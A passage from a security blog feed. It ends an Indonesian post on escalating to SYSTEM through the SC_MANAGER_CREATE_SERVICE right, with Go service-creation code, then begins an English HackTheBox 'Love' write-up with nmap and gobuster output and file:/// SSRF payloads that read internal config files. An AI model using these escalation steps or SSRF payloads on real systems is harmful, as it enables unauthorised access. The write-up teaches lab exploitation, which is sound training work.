</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// Creation of a Service: STEP 3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// Don&#39;t close the svcHandle, instead send it to StartService
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">StartService</span><span class="p">(</span><span class="nx">svcHandle</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="kc">nil</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Print</span><span class="p">(</span><span class="s">&#34;Error Starting service&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="nx">os</span><span class="p">.</span><span class="nf">Exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Creation of a Service: STEP 4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// Finally close the handles
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">windows</span><span class="p">.</span><span class="nf">CloseServiceHandle</span><span class="p">(</span><span class="nx">svcHandle</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nx">windows</span><span class="p">.</span><span class="nf">CloseHandle</span><span class="p">(</span><span class="nx">scmHandle</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>VbScrub sendiri sebelumnya telah menuliskan kode untuk mendemonstrasikan hal ini, bisa dilihat <a href="https://github.com/VbScrub/ServiceInstallerTest">disini</a>.</p>
<p><em>Hasilnya</em>?</p>
<p>SYSTEM!*</p>
<p><div class="img-container"><img src="imgs/image-20210813011334034.png" alt="image-20210813011334034"  /></div>
</p>
<blockquote>
<p>*Perlu diingat user yang menjalankan program sudah perlu hak akses <code>SC_MANAGER_CREATE_SERVICE</code>.</p>
</blockquote>
<p><em>Tapi, kenapa harus custom code?</em></p>
<p>Karena <code>sc.exe</code> sendiri tidak menyediakan opsi untuk meng-assign <code>SERVICE_ALL_ACCESS</code> pada service yang akan dibuat. Ditambah, setelah proses pembuatan service, handle-handlenya ditutup.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc create
</span></span><span class="line"><span class="cl">DESCRIPTION:
</span></span><span class="line"><span class="cl">        Creates a service entry in the registry and Service Database.
</span></span><span class="line"><span class="cl">USAGE:
</span></span><span class="line"><span class="cl">        sc &lt;server&gt; create <span class="o">[</span>service name<span class="o">]</span> <span class="o">[</span><span class="nv">binPath</span><span class="o">=</span> <span class="o">]</span> &lt;option1&gt; &lt;option2&gt;...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">OPTIONS:
</span></span><span class="line"><span class="cl">NOTE: The option name includes the equal sign.
</span></span><span class="line"><span class="cl">      A space is required between the equal sign and the value.
</span></span><span class="line"><span class="cl"> <span class="nv">type</span><span class="o">=</span> &lt;own<span class="p">|</span>share<span class="p">|</span>interact<span class="p">|</span>kernel<span class="p">|</span>filesys<span class="p">|</span>rec<span class="p">|</span>userown<span class="p">|</span>usershare&gt;
</span></span><span class="line"><span class="cl">       <span class="o">(</span><span class="nv">default</span> <span class="o">=</span> own<span class="o">)</span>
</span></span><span class="line"><span class="cl"> <span class="nv">start</span><span class="o">=</span> &lt;boot<span class="p">|</span>system<span class="p">|</span>auto<span class="p">|</span>demand<span class="p">|</span>disabled<span class="p">|</span>delayed-auto&gt;
</span></span><span class="line"><span class="cl">       <span class="o">(</span><span class="nv">default</span> <span class="o">=</span> demand<span class="o">)</span>
</span></span><span class="line"><span class="cl"> <span class="nv">error</span><span class="o">=</span> &lt;normal<span class="p">|</span>severe<span class="p">|</span>critical<span class="p">|</span>ignore&gt;
</span></span><span class="line"><span class="cl">       <span class="o">(</span><span class="nv">default</span> <span class="o">=</span> normal<span class="o">)</span>
</span></span><span class="line"><span class="cl"> <span class="nv">binPath</span><span class="o">=</span> &lt;BinaryPathName to the .exe file&gt;
</span></span><span class="line"><span class="cl"> <span class="nv">group</span><span class="o">=</span> &lt;LoadOrderGroup&gt;
</span></span><span class="line"><span class="cl"> <span class="nv">tag</span><span class="o">=</span> &lt;yes<span class="p">|</span>no&gt;
</span></span><span class="line"><span class="cl"> <span class="nv">depend</span><span class="o">=</span> &lt;Dependencies<span class="o">(</span>separated by / <span class="o">(</span>forward slash<span class="o">))</span>&gt;
</span></span><span class="line"><span class="cl"> <span class="nv">obj</span><span class="o">=</span> &lt;AccountName<span class="p">|</span>ObjectName&gt;
</span></span><span class="line"><span class="cl">       <span class="o">(</span><span class="nv">default</span> <span class="o">=</span> LocalSystem<span class="o">)</span>
</span></span><span class="line"><span class="cl"> <span class="nv">DisplayName</span><span class="o">=</span> &lt;display name&gt;
</span></span><span class="line"><span class="cl"> <span class="nv">password</span><span class="o">=</span> &lt;password&gt;
</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
<p>Disini kita tahu bahwa regular user dengan hak pembuatan service (<code>SC_MANAGER_CREATE_SERVICE</code>)  dapat membuat sebuah service tapi tidak memiliki kontrol langsung untuk menjalankan service tersebut. Namun, beda ceritanya jika handle yang didapatkan dari pembuatan sebuah service langsung digunakan untuk melakukan kontrol terhadap service yang dibuat.</p>
<p>Saya sendiri setuju dengan VbScrub bahwa ini kemungkinan bukan security issue. Karena kalau kita mengacu ke <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights?">dokumentasi Microsoft</a>, bisa disimpulkan secara tidak langsung jika user yang mampu membuat service adalah termasuk admin.</p>
<p><div class="img-container"><img src="imgs/image-20210812194031337.png" alt="image-20210812194031337"  /></div>
</p>
<p>Untuk eksploitasi hak <code>SC_MANAGER_CREATE_SERVICE</code> tanpa custom compiled program kita bisa mengubah nilai &ldquo;start up type&rdquo; si service ke otomatis ketika booting dengan mensuplai <code>start=auto</code> di <code>sc.exe</code>.</p>
<p>Sekian~</p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>*Ngulik itu sebangsa ngoprek 😅&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Love</title>
      <link>https://fahmifj.github.io/hackthebox/love/</link>
      <pubDate>Mon, 09 Aug 2021 05:38:45 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/love/</guid>
      <description>SSRF in beginner-level</description>
      <content:encoded><![CDATA[<p>Love from Hack The Box hosts a voting system application and an online file scanner. The file scanner is vulnerable to SSRF, which can be exploited to leak a set of credentials that can be used to login into the voting app. The photo upload functionality can be leveraged to drop a web shell, which is then used to gain interactive shell access on the machine. Enumeration of the system reveals that <code>AlwaysInstallElevated</code> is enabled, and this can be leveraged to install a malicious <code>.msi</code> installer and get SYSTEM access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>SSRF</li>
<li>Abusing Windows <strong>AlwaysInstallElevated</strong></li>
<li>(Alternative) PrintNightmare LPE</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
<li>WinPEAS</li>
<li>msfvenom</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan scan discovers a bunch of open ports.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ fscan 10.10.10.239 love
</span></span><span class="line"><span class="cl">nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span> 10.10.10.239 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
</span></span><span class="line"><span class="cl">nmap -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 -sC -sV -oA nmap/10-tcp-allport-love 10.10.10.239
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-08 11:29 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.239
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.087s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE      VERSION
</span></span><span class="line"><span class="cl">80/tcp    open  http         Apache httpd 2.4.46 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Voting System using PHP
</span></span><span class="line"><span class="cl">135/tcp   open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
</span></span><span class="line"><span class="cl">443/tcp   open  ssl/http     Apache httpd 2.4.46 <span class="o">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>staging.love.htb/organizationName<span class="o">=</span>ValentineCorp/stateOrProvinceName<span class="o">=</span>m/countryName<span class="o">=</span>in
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-01-18T14:00:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-01-18T14:00:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds Windows <span class="m">10</span> Pro <span class="m">19042</span> microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
</span></span><span class="line"><span class="cl">3306/tcp  open  mysql?
</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, NULL, NotesRPC, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, WMSRequest, oracle-tns: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Host <span class="s1">&#39;10.10.14.51&#39;</span> is not allowed to connect to this MariaDB server
</span></span><span class="line"><span class="cl">5000/tcp  open  http         Apache httpd 2.4.46 <span class="o">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: <span class="m">403</span> Forbidden
</span></span><span class="line"><span class="cl">5040/tcp  open  unknown
</span></span><span class="line"><span class="cl">5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
</span></span><span class="line"><span class="cl">5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>LOVE
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:LOVE, DNS:Love
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-04-11T14:39:19
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2024-04-10T14:39:19
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-08-08T15:53:52+00:00<span class="p">;</span> +21m37s from scanner time.
</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
</span></span><span class="line"><span class="cl">7680/tcp  open  pando-pub?
</span></span><span class="line"><span class="cl">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
</span></span><span class="line"><span class="cl">49664/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49665/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49666/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49667/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49668/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49669/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49670/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class="line"><span class="cl">SF-Port3306-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>8/8%Time<span class="o">=</span>610FF878%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NUL
</span></span><span class="line"><span class="cl">SF:L,4A,<span class="s2">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.51&#39;\x20is\x20not\x20allowe
</span></span></span><span class="line"><span class="cl"><span class="s2">...[SNIP]...
</span></span></span><span class="line"><span class="cl"><span class="s2">Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Host script results:
</span></span></span><span class="line"><span class="cl"><span class="s2">|_clock-skew: mean: 2h06m37s, deviation: 3h30m01s, median: 21m36s
</span></span></span><span class="line"><span class="cl"><span class="s2">| smb-os-discovery: 
</span></span></span><span class="line"><span class="cl"><span class="s2">|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
</span></span></span><span class="line"><span class="cl"><span class="s2">|   OS CPE: cpe:/o:microsoft:windows_10::-
</span></span></span><span class="line"><span class="cl"><span class="s2">|   Computer name: Love
</span></span></span><span class="line"><span class="cl"><span class="s2">|   NetBIOS computer name: LOVE\x00
</span></span></span><span class="line"><span class="cl"><span class="s2">|   Workgroup: WORKGROUP\x00
</span></span></span><span class="line"><span class="cl"><span class="s2">|_  System time: 2021-08-08T08:53:41-07:00
</span></span></span><span class="line"><span class="cl"><span class="s2">| smb-security-mode: 
</span></span></span><span class="line"><span class="cl"><span class="s2">|   account_used: &lt;blank&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">|   authentication_level: user
</span></span></span><span class="line"><span class="cl"><span class="s2">|   challenge_response: supported
</span></span></span><span class="line"><span class="cl"><span class="s2">|_  message_signing: disabled (dangerous, but default)
</span></span></span><span class="line"><span class="cl"><span class="s2">| smb2-security-mode: 
</span></span></span><span class="line"><span class="cl"><span class="s2">|   2.02: 
</span></span></span><span class="line"><span class="cl"><span class="s2">|_    Message signing enabled but not required
</span></span></span><span class="line"><span class="cl"><span class="s2">| smb2-time: 
</span></span></span><span class="line"><span class="cl"><span class="s2">|   date: 2021-08-08T15:53:43
</span></span></span><span class="line"><span class="cl"><span class="s2">|_  start_date: N/A
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class="line"><span class="cl"><span class="s2">Nmap done: 1 IP address (1 host up) scanned in 137.03 seconds
</span></span></span></code></pre></div><p>Most notable services are:</p>
<ul>
<li>An Apache web server that handles 3 websites on port 80, 443, and 5000 (this one is forbidden).</li>
<li>SMB on port 445, good start.</li>
<li>A MySQL server on port 3306, I will stay away from this for now because IP block</li>
<li>WinRM on 5985/6, I will use this for lateral movement if I have creds.</li>
</ul>
<p>Seeing Apache and MySQL on a Windows host, I can assume that this machine uses XAMPP.</p>
<p>Nmap also identified two hostnames: <code>www.love.htb</code> and <code>staging.love.htb</code>. I will add these to my <code>/etc/hosts</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ sudo <span class="nb">echo</span> <span class="s1">&#39;www.love.htb staging.love.htb&#39;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>Anonymous login is not allowed here, I will re-visit this later when I have creds.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ smbclient -N -L //10.10.10.239 
</span></span><span class="line"><span class="cl">session setup failed: NT_STATUS_ACCESS_DENIED
</span></span></code></pre></div><h3 id="tcp-5000">TCP 5000</h3>
<p>Visiting this port results in a <strong>403 Forbidden</strong> message error.</p>
<p><div class="img-container"><img src="imgs/image-20210809005411183.png" alt="image-20210809005411183"  /></div>
</p>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting port 80 with the IP or the hostname returns the same content.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ <span class="k">for</span> i in 10.10.10.239 www.love.htb<span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> -n <span class="s2">&#34;</span><span class="nv">$i</span><span class="s2"> &#34;</span><span class="p">;</span> curl -s <span class="nv">$i</span> <span class="p">|</span> wc -c<span class="p">;</span> <span class="k">done</span>                      
</span></span><span class="line"><span class="cl">10.10.10.239 <span class="m">4388</span>
</span></span><span class="line"><span class="cl">www.love.htb <span class="m">4388</span>
</span></span></code></pre></div><p>On the browser, the site displays a login form of a Voting System app.</p>
<p><div class="img-container"><img src="imgs/image-20210809003519382.png" alt="image-20210809003519382"  /></div>
</p>
<p>Trying some random IDs and common passwords didn&rsquo;t work here.</p>
<p><div class="img-container"><img src="imgs/image-20210809004024045.png" alt="image-20210809004024045"  /></div>
</p>
<h4 id="gobuster">Gobuster</h4>
<p><code>Gobuster</code> discovers a bunch of directories, but one that stands out is  <code>/admin</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ gobuster dir -f -u http://www.love.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -x txt,php -o gobuster/gobuster-S-80 -t <span class="nv">40</span>                                                                                                                                                           
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.1.0
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://www.love.htb/
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">40</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extensions:              txt,php
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Add Slash:               <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/08/08 13:16:14 Starting gobuster in directory enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">/cgi-bin/             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>
</span></span><span class="line"><span class="cl">/admin/               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 6198<span class="o">]</span>
</span></span><span class="line"><span class="cl">/includes/            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2261<span class="o">]</span>
</span></span><span class="line"><span class="cl">/plugins/             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2490<span class="o">]</span>
</span></span><span class="line"><span class="cl">/images/              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2719<span class="o">]</span>
</span></span><span class="line"><span class="cl">/logout.php           <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; index.php<span class="o">]</span>
</span></span><span class="line"><span class="cl">/login.php            <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; index.php<span class="o">]</span>
</span></span><span class="line"><span class="cl">/webalizer/           <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/home.php             <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; index.php<span class="o">]</span>
</span></span><span class="line"><span class="cl">/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 4388<span class="o">]</span>             
</span></span><span class="line"><span class="cl">/phpmyadmin/          <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/icons/               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 74798<span class="o">]</span>            
</span></span><span class="line"><span class="cl">/preview.php          <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; index.php<span class="o">]</span>
</span></span><span class="line"><span class="cl">/examples/            <span class="o">(</span>Status: 503<span class="o">)</span> <span class="o">[</span>Size: 402<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/dist/                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1389<span class="o">]</span>             
</span></span><span class="line"><span class="cl">/tcpdf/               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2710<span class="o">]</span>             
</span></span><span class="line"><span class="cl">/licenses/            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 421<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/server-status/       <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 421<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/con.php              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/con/                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/con.txt              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/aux/                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/aux.php              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/aux.txt              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
</span></span><span class="line"><span class="cl">                                                             
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/08/08 13:18:01 <span class="nv">Finished</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span></code></pre></div><h4 id="admin">/admin</h4>
<p>When I visit <code>/admin</code>, the page presents the same login form. But this time, instead of voter&rsquo;s ID, it uses username.</p>
<p><div class="img-container"><img src="imgs/image-20210809003454272.png" alt="image-20210809003454272"  /></div>
</p>
<p>Submitting several credentials only reveals that <code>admin</code> is a valid username here.</p>
<h3 id="tcp-80---staginglovehtb">TCP 80 - staging.love.htb</h3>
<p>On <code>staging.love.htb</code>, the site provides an online file scanner.</p>
<p><div class="img-container"><img src="imgs/image-20210809010051350.png" alt="image-20210809010051350"  /></div>
</p>
<p>The &ldquo;Demo&rdquo; menu points to <code>/beta.php</code>, and it allows visitor to insert a URL there.</p>
<p><div class="img-container"><img src="imgs/image-20210809010747052.png" alt="image-20210809010747052"  /></div>
</p>
<p>While having my netcat listener in listening mode, I entered my HTB IP there, and my listener received the following request.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">80</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.51<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.239<span class="o">]</span> <span class="m">49806</span>
</span></span><span class="line"><span class="cl">GET /iamf HTTP/1.1
</span></span><span class="line"><span class="cl">Host: 10.10.14.51
</span></span><span class="line"><span class="cl">Accept: */*
</span></span></code></pre></div><p>Based on the received request, I&rsquo;m guessing the request was crafted using PHP curl. If the user agent contains &ldquo;WindowsPowerShell&rdquo;, I&rsquo;m going to use Responder to see if I can steal the NTLMv2 response.</p>
<p>Playing a bit with it reveals that it can render HTML.</p>
<p><div class="img-container"><img src="imgs/image-20210809014613874.png" alt="image-20210809014613874"  /></div>
</p>
<p>The key take away from here is that <code>staging.love.htb/beta.php</code> <strong>can make a HTTP request.</strong></p>
<h3 id="tcp-443---website">TCP 443 - Website</h3>
<p>On HTTPS, the SSL certificate leaks an email address and a potential username: <code>roy@love.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210809005318725.png" alt="image-20210809005318725"  /></div>
</p>
<p>And both the HTTPS versions of <code>www.love.htb</code> and <code>staging.love.htb</code> return the Forbidden message error.</p>
<p><div class="img-container"><img src="imgs/image-20210809012934262.png" alt="image-20210809012934262"  /></div>
</p>
<p><div class="img-container"><img src="imgs/image-20210809012945191.png" alt="image-20210809012945191"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-phoebe">Shell as phoebe</h3>
<h4 id="ssrf">SSRF</h4>
<p>The behavior of the file scanner on <code>staging.love.htb</code> making a HTTP (not always) request can be abused to access internal resources that previously were inaccessible due to IP restrictions. This attack is often referred as Server-Side Request Forgery (SSRF).</p>
<p>When I submit <code>file:///C:/xampp/apache/conf/extra/httpd-vhosts.conf</code>, it returns the virtual host configuration file.</p>
<p><div class="img-container"><img src="imgs/image-20210809033303050.png" alt="image-20210809033303050"  /></div>
</p>
<p>The string &ldquo;C:/xampp/htdocs/passwordmanager&rdquo; immediately draws my attention. Based on that config, the service on port 5000 is a password manager, and the access is limited to only allow connections from <code>127.0.0.1</code>.</p>
<p>Assuming there is an index file, I try to submit  <code>file:///C:/xampp/htdocs/passwordmanager/index.php</code> , and the file is exist.</p>
<p><div class="img-container"><img src="imgs/image-20210809034759102.png" alt="image-20210809034759102"  /></div>
</p>
